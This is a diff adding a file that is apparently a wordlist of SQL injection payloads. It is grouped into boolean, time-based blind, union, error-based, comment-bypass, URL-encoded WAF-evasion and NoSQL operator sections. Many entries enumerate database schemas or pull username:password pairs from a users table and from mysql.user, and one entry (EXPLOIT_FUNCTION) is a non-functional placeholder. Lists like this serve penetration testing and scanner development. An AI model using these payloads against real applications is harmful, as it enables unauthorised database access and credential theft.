@@ -1,0 +1,139 @@
+# ------------------------------
+# Basic Payloads
+# ------------------------------
+'
+"
+`
+') -- 
+')# 
+" OR "a"="a
+') OR ('1'='1
+' OR 'x'='x' --
+' AND '1'='1 --
+' OR 1=1 --
+" OR 1=1 --
+' OR 1=1 --+
+' OR 1=1/*
+' OR 1=1# 
+
+# ------------------------------
+# Boolean-Based Payloads
+# ------------------------------
+' OR '1'='1
+" OR "1"="1
+' AND '1'='1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+' OR '1'='1'-- -
+" OR "1"="1"-- -
+') OR ('1'='1'--
+') AND ('1'='2'--
+' OR 'a'='a' --
+" OR "a"="a" --
+' OR "a"="a" AND 1=1--
+" OR "a"="a" AND 1=1--
+
+# ------------------------------
+# Time-Based Blind Payloads
+# ------------------------------
+' OR SLEEP(5)--
+' OR pg_sleep(5)--
+' OR IF(1=1, SLEEP(5), 0)--
+" OR pg_sleep(5)--
+') AND SLEEP(5)--
+' AND pg_sleep(5) AND '1'='1
+' OR BENCHMARK(1000000,MD5('test'))--
+" OR BENCHMARK(1000000,MD5('test'))--
+' OR IF(1=1, BENCHMARK(1000000,MD5('test')), 0)--
+' AND BENCHMARK(1000000,MD5('test'))--
+' AND IF(1=1, BENCHMARK(1000000,MD5('test')), 0)--
+' OR IF(1=1, SLEEP(5), NULL)--
+' AND IFNULL(NULL, SLEEP(5))--
+
+# ------------------------------
+# Union-Based Payloads
+# ------------------------------
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+" UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION SELECT 1,version()--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
+' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT 1,group_concat(username, ':', password) FROM users--
+' UNION SELECT user(), database()--
+' UNION SELECT null, version()--
+' UNION SELECT null, user()--
+' UNION SELECT null, database()--
+' UNION SELECT table_name, column_name FROM information_schema.columns--
+
+# ------------------------------
+# Error-Based Payloads
+# ------------------------------
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
+' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT DATABASE())))--
+' AND UPDATEXML(NULL,CONCAT(0x3a,(SELECT DATABASE())),NULL)--
+' OR 1=1-(SELECT 1 UNION SELECT 2)--
+' OR 1=1-(SELECT 1 UNION SELECT version())--
+' AND EXPLOIT_FUNCTION(1, 2) --
+' OR 1=2--
+' OR 1=1 HAVING 1=1--
+
+# ------------------------------
+# Comment Bypass Payloads
+# ------------------------------
+'--
+' #
+'/* 
+' AND '1'='1 -- 
+' OR 1=1/* 
+' AND '1'='1/*
+' AND 1=1# --
+' OR '1'='1' --+
+' OR '1'='1'/* 
+' OR '1'='1';--
+
+# ------------------------------
+# Advanced WAF Bypass Payloads
+# ------------------------------
+%27%20OR%201%3D1--
+%22%20OR%201%3D1--
+%27%20AND%201%3D2%20UNION%20ALL%20SELECT%20NULL,NULL,NULL--
+%27%20AND%20SLEEP(5)--
+%27%23
+%27%2F*
+%27%2D%2D+
+%22%20AND%20EXTRACTVALUE%281,%20CONCAT%280x5c,%20%28SELECT%20DATABASE%28%29%29%29%29%29--+
+%2F**/SELECT%20*%20FROM%20mysql.user%20WHERE%20`user`%20LIKE%20'admin'--
+%2F**/SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES--
+%27%2D%2D%20OR%20%27%27%3D%27--
+
+# ------------------------------
+# NoSQL-Inspired Payloads (Optional for testing hybrid systems)
+# ------------------------------
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$gt": ""}}
+' OR 1=1 -- 
+' AND 1=1 AND '1'='1 --
+
+# ------------------------------
+# Custom Payloads for Debugging
+# ------------------------------
+' UNION SELECT version(),user()--
+' AND (SELECT DATABASE())--
+' AND IF(1=1,BENCHMARK(1000000,MD5(1)),0)--
+' AND (SELECT table_schema FROM information_schema.tables LIMIT 1)--
+' AND (SELECT table_name FROM information_schema.tables WHERE table_name='users')--
+' UNION SELECT 1,2,group_concat(username,':',password) FROM users--
+' OR IFNULL((SELECT DATABASE()),0)--
+' OR IFNULL(user(),0)--
+' AND (SELECT GROUP_CONCAT(user()) FROM mysql.user)--
+' AND (SELECT GROUP_CONCAT(database()) FROM information_schema.tables)--
+' AND (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables LIMIT 1)--
+' OR EXTRACTVALUE(1, CONCAT(0x5c, (SELECT VERSION())))--
+' AND (SELECT COUNT(*) FROM mysql.user) --
